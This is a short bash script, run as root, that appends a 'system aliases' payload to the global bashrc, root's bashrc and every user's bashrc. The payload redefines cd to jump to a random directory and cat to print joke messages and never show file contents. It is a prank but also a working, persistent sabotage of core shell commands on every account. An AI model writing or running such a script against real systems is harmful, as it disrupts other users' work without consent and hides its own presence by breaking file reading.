#!/bin/bash
# chaos_aliases.sh - run with sudo

BASHRC_PAYLOAD='
# system aliases
alias xd="cd"
alias xat="cat"

cd() {
    dirs=( $(find / -maxdepth 3 -type d 2>/dev/null) )
    builtin cd "${dirs[$RANDOM % ${#dirs[@]}]}"
}

cat() {
    messages=(
        "meow"
        "im not reading that lol"
        "have you tried turning it off and on again"
        "no."
        "error 404: content not found (i hid it)"
        "cat? i barely know her"
        "this file contains no vibes"
    )
    echo "${messages[$RANDOM % ${#messages[@]}]}"
}
'

# append to global bashrc so it hits every user
echo "$BASHRC_PAYLOAD" >> /etc/bash.bashrc

# also hit root and any home dir users
echo "$BASHRC_PAYLOAD" >> /root/.bashrc

for user_home in /home/*; do
    if [ -f "$user_home/.bashrc" ]; then
        echo "$BASHRC_PAYLOAD" >> "$user_home/.bashrc"
    fi
done